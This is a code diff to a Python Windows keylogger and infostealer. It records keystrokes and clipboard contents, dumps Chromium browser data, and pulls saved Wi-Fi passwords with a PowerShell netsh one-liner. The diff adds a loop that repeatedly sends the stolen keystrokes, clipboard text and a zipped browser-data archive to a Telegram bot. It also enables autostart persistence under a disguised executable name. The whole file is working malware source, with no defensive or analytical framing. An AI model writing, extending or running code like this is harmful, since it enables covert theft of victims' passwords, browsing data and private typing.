@@ -1,14 +1,19 @@
+from time import sleep
 from pynput import keyboard
-import time, threading, pyperclip, shutil, os, subprocess
+import time, threading, pyperclip, shutil, os, subprocess, requests
 from pathlib import Path
+from dotenv import load_dotenv
 
-kelogger_data = []
+load_dotenv()
+keylogger_data = []
 clipboard_data = []
 system_info_data = []
 current_data_pos = 0
 has_been_pressed = False
+system_data_sent = False
 keylogger_wait_time = 3
 clipboard_wait_time = 3
+send_data_sleep_time = 20
 startup_file_name = "ClientClt.exe"
 browser_data_path = r'C:\ProgramData\ConfigLogs\sys32\\'
 system_info_commands = ['Invoke-RestMethod "https://ipinfo.io/json"', 'Get-NetIPConfiguration',
@@ -17,9 +22,13 @@ system_info_commands = ['Invoke-RestMethod "https://ipinfo.io/json"', 'Get-NetIP
                         'systeminfo | findstr /B /C:"Host Name" /C:"Domain"',
                         '''(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $n=($_ -split ':',2)[1].Trim(); $p=netsh wlan show profile name="$n" key=clear; $k=$p | Select-String 'Key Content'; "$n : " + $(if($k){($k -split ':',2)[1].Trim()}else{'<no password>'}) }''']
 
+TOKEN = os.getenv("TELEGRAM_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
+telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+
 
 def on_press(key):
-    global has_been_pressed, kelogger_data
+    global has_been_pressed, keylogger_data
     try:
         if key.vk in range(96, 106):
             # numpad numbers 0-9
@@ -40,18 +49,18 @@ def on_press(key):
             return
     if formated is None or formated == "":
         return
-    if len(kelogger_data) > current_data_pos:
-        kelogger_data[current_data_pos] += formated
+    if len(keylogger_data) > current_data_pos:
+        keylogger_data[current_data_pos] += formated
     else:
-        kelogger_data.append(formated)
+        keylogger_data.append(formated)
 
     has_been_pressed = True
-    # print(kelogger_data)
+    # print(keylogger_data)
 
 
 def change_current():
-    global current_data_pos, has_been_pressed, kelogger_data
-    if has_been_pressed == False and len(kelogger_data) > current_data_pos:
+    global current_data_pos, has_been_pressed, keylogger_data
+    if has_been_pressed == False and len(keylogger_data) > current_data_pos:
         current_data_pos += 1
     has_been_pressed = False
     time.sleep(keylogger_wait_time)
@@ -96,6 +105,57 @@ def get_chromium_browsers_data():
     subprocess.run([path] + ["chrome", '-o', browser_data_path])
 
 
+def send_telegram(text):
+    response = requests.post(
+        telegram_url,
+        json={
+            "chat_id": CHAT_ID,
+            "text": text
+        }
+    )
+
+    return response.json()
+
+
+def send_all_data():
+    sleep(send_data_sleep_time)
+    global system_data_sent, system_info_data
+    data = ""
+    # send system info amd browser info only once
+    if not system_data_sent:
+        for i in system_info_data:
+            data += i + "\n"
+
+        zip_file = shutil.make_archive(
+            browser_data_path,
+            "zip",
+            browser_data_path
+        )
+        send_file(zip_file)
+        system_data_sent = True
+    data += str(keylogger_data) + "\n"
+    data += str(clipboard_data) + "\n"
+
+    send_telegram(data)
+    sleep(2)
+    send_all_data()
+
+
+def send_file(file_path):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+
+    with open(file_path, "rb") as file:
+        response = requests.post(
+            url,
+            data={"chat_id": CHAT_ID},
+            files={"document": file},
+            timeout=60
+        )
+
+    response.raise_for_status()
+    return response.json()
+
+
 # get Chromium browser data
 threading.Thread(target=get_chromium_browsers_data, daemon=True).start()
 
@@ -103,10 +163,13 @@ threading.Thread(target=get_chromium_browsers_data, daemon=True).start()
 threading.Thread(target=get_system_info, daemon=True).start()
 
 # add exe to autostart
-# threading.Thread(target=create_schedule_task, daemon=True).start()
+threading.Thread(target=create_schedule_task, daemon=True).start()
 
 # clipboard start
 threading.Thread(target=clipboard_checker, daemon=True).start()
+
+# send data via telegram
+threading.Thread(target=send_all_data, daemon=True).start()
 
 # keylogger start
 with keyboard.Listener(on_press=on_press) as listener:
